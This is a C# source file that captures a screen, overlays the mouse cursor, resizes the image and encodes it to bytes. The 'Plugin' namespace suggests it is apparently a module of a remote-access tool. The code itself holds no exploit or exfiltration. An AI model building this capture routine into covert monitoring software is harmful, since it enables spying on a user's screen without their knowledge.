using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using static Plugin.Imports;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    internal class Helpers
    {
		private static ImageCodecInfo GetEncoderInfo(ImageFormat format)
		{
			try
			{
				int j = 0;
				ImageCodecInfo[] encoders = ImageCodecInfo.GetImageEncoders();

				j = 0;
				while (j < encoders.Length)
				{
					if (encoders[j].FormatID == format.Guid)
					{
						return encoders[j];
					}
					j += 1;
				}
				//return null;
			}
			catch { }
			return null;
		}

		internal static byte[] Capture(int width, int height, int quality, string format, short screen = 0)
		{
			try
			{
				Bitmap img = new Bitmap(Screen.AllScreens[screen].Bounds.Width, Screen.AllScreens[screen].Bounds.Height);

				Graphics graphics = Graphics.FromImage(img);

				graphics.CompositingQuality = CompositingQuality.HighSpeed;

				graphics.CopyFromScreen(0, 0, 0, 0, new Size(Screen.AllScreens[screen].Bounds.Width, Screen.AllScreens[screen].Bounds.Height), CopyPixelOperation.SourceCopy);

				Point P = new Point();

				GetCursorPos(out P);

				CURSORINFOHELPER CS = new CURSORINFOHELPER();

				CS.cbSize = Marshal.SizeOf(CS);

				GetCursorInfo(ref CS);

				if (CS.flags == 0x1)
				{
					graphics.DrawIcon(Icon.FromHandle(CS.hCursor), P.X, P.Y);
				}

				Bitmap Resize = new Bitmap(width, height);
				Graphics g2 = Graphics.FromImage(Resize);
				g2.CompositingQuality = CompositingQuality.HighSpeed;
				g2.DrawImage(img, new Rectangle(0, 0, width, height), new Rectangle(0, 0, Screen.AllScreens[screen].Bounds.Width, Screen.AllScreens[screen].Bounds.Height), GraphicsUnit.Pixel);

				EncoderParameter encoderParameter = new EncoderParameter(Encoder.Quality, quality);
				ImageCodecInfo encoderInfo = null;

				switch (format)
				{
					case "PNG":
						encoderInfo = GetEncoderInfo(ImageFormat.Png);
						break;

					case "JPEG":
						encoderInfo = GetEncoderInfo(ImageFormat.Jpeg);
						break;

					case "GIF":
						encoderInfo = GetEncoderInfo(ImageFormat.Gif);
						break;
				}

				EncoderParameters encoderParameters = new EncoderParameters(1);
				encoderParameters.Param[0] = encoderParameter;
				System.IO.MemoryStream MS = new System.IO.MemoryStream();
				Resize.Save(MS, encoderInfo, encoderParameters);
				graphics.Dispose();
				g2.Dispose();
				img.Dispose();
				Resize.Dispose();
				MS.Dispose();
				encoderParameter.Dispose();
				encoderParameters.Dispose();
				return MS.ToArray();
			}
			catch { }
			return null;
		}
	}
}
